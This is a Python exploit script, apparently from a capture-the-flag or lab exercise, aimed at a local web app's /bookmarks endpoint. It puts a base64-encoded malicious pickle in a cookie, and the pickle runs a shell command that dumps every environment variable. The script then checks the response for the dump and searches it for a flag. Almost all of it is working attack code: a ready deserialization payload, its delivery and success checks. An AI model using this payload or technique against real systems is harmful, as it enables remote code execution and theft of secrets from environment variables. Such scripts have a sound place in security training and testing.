import requests
import base64

def test_payload_delivery():
    """Test delivering the pickle payload via the bookmarks cookie"""
    
    # The malicious pickle payload that extracts environment variables
    # Using the verbose version that prints env vars to stdout
    pickle_payload = "gASVnwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjIRweXRob24gLWMgImltcG9ydCBvczsgcHJpbnQoJz09PUVOVl9WQVJTX1NUQVJUPT09Jyk7IFtwcmludChmJ3trfT17dn0nKSBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKV07IHByaW50KCc9PT1FTlZfVkFSU19FTkQ9PT0nKSKUhZRSlC4="
    
    # Target URL
    url = "http://127.0.0.1/bookmarks"
    
    # Cookies to send
    cookies = {
        'user': '46cfd3242b22494d99f6a1673699dfe1',  # Use the existing user cookie
        'bookmarks': pickle_payload  # Inject the malicious payload
    }
    
    print(f"[*] Sending payload to: {url}")
    print(f"[*] Using cookies: {list(cookies.keys())}")
    print(f"[*] Payload length: {len(pickle_payload)} chars")
    
    try:
        # Send GET request with the malicious cookie
        response = requests.get(url, cookies=cookies, timeout=10)
        
        print(f"\n[+] Response received:")
        print(f"Status Code: {response.status_code}")
        print(f"Content-Type: {response.headers.get('content-type', 'N/A')}")
        print(f"\n[+] Response Body:\n{response.text}")
        
        # Check if the payload executed (look for env var markers)
        if "===ENV_VARS_START===" in response.text:
            print("\n[✓] SUCCESS! Payload executed and environment variables extracted!")
            print("[+] Looking for FLAG in the output...")
            
            # Try to extract FLAG from the output
            import re
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
                return True
            else:
                print("[-] No FLAG pattern found in response")
        else:
            print("[✗] Payload may not have executed as expected")
            
            # Check if the response shows any error or different behavior
            if response.status_code != 200:
                print(f"[!] Unusual status code: {response.status_code}")
            if len(response.text) > 1000:
                print(f"[!] Large response received ({len(response.text)} bytes) - might contain data")
            
        return False
        
    except Exception as e:
        print(f"[✗] Error sending request: {e}")
        return False

# Execute the test
test_payload_delivery()

